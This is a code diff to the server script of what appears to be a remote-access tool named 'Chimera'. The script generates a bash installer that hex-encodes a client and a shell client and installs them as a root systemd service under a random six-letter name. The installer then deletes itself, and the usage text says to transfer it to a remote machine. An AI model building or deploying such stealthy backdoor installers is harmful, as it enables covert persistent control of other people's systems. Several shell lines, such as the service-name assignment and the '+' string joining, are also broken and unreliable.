@@ -18,28 +18,33 @@ def createInstaller(host):
         
         contents = """
 #!/bin/bash     
-CLIENTCONTS=""" + clientConts.encode().hex()} + """
-SECCLIENTCONTS=""" + shellConts.encode().hex()} + """
+CLIENTCONTS=""" + clientConts.encode().hex() + """
+SECCLIENTCONTS=""" + shellConts.encode().hex() + """
 
-hex=${CLIENTCONTS//[^0-9a-fA-F]/}    # strip spaces/newlines/non-hex
+# CLIENTCONTS holds your hex (it may contain spaces/newlines)
+hex=${CLIENTCONTS//[^0-9a-fA-F]/}       # remove all non-hex so pairing can't misalign
 (( ${#hex} % 2 )) && { echo "odd-length hex"; exit 1; }
 
+# decode without command substitution (so we don't drop the final newline)
 decoded=""
 for ((i=0; i<${#hex}; i+=2)); do
   decoded+=$(printf "\\x${hex:i:2}")
 done
 CLIENTCONTS=$decoded
-hex=${SECCLIENTCONTS//[^0-9a-fA-F]/}    # strip spaces/newlines/non-hex
+
+hex=${SECCLIENTCONTS//[^0-9a-fA-F]/}       # remove all non-hex so pairing can't misalign
 (( ${#hex} % 2 )) && { echo "odd-length hex"; exit 1; }
 
+# decode without command substitution (so we don't drop the final newline)
 decoded=""
 for ((i=0; i<${#hex}; i+=2)); do
   decoded+=$(printf "\\x${hex:i:2}")
 done
 SECCLIENTCONTS=$decoded
+
 SERVICENAME=str=$(tr -dc 'a-z' < /dev/urandom | head -c6)
 
-SERVICEFILE="/lib/systemd/system/"+$SERVICENAME+".service"
+SERVICEFILE="/lib/systemd/system/"+"$SERVICENAME"+".service"
 
 cat << EOFA > $SERVICEFILE
 [Unit]
@@ -76,7 +81,7 @@ rm $0
         f.close()
         print("Installer creation complete. Open the installer file to view the service name as it is a length-6 string of random letters")
 
-if (len(sys.argv) != 2):
+if (len(sys.argv) != 2) and (len(sys.argv) != 3):
     print("""
 Usage: server.py {ip to listen on}
 OR: server.py -s {ip of server}     |     This will create an install file for the current client.py and shellClient.py files. Simply transfer the install file to the remote machine and run it (as root) and it'll install Chimera
